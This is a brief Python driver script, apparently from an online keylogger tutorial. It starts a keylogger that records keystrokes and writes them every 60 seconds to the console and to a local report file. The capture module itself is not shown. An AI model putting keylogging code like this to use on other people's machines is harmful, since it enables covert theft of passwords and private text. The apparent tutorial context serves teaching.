# https://www.thepythoncode.com/article/write-a-keylogger-python

import logger
from keylogger import Keylogger

if __name__ == '__main__':
    keylogger = Keylogger().save_each(60)
    keylogger.attach_logger(logger.ConsoleLogger())
    keylogger.attach_logger(logger.FileLogger('./keylogger-report.txt'))
    keylogger.wait()